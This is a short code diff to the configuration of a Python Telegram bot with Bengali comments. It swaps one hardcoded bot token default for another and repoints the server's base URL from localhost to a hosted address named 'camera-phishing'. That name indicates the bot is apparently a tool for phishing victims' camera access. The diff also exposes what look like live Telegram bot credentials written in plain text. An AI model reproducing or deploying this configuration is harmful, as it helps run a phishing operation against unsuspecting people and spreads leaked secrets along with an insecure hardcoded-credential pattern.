@@ -16,9 +16,9 @@ from io import BytesIO
 load_dotenv()
 
 # কনফিগারেশন
-BOT_TOKEN = os.getenv('BOT_TOKEN', '7697230079:AAHtROsMAfo27ZsiEdMPvZpCFv0KkFA88Hk')
+BOT_TOKEN = os.getenv('BOT_TOKEN', '8667159815:AAF-tTp5BhziyW69NPpcYGzc4l94BUN9_Mg')
 PORT = int(os.getenv('PORT', 3000))
-BASE_URL = os.getenv('BASE_URL', 'http://localhost:3000')
+BASE_URL = os.getenv('BASE_URL', 'https://camera-phishing-rvxb.onrender.comz')
 
 # লগিং সেটআপ
 logging.basicConfig(
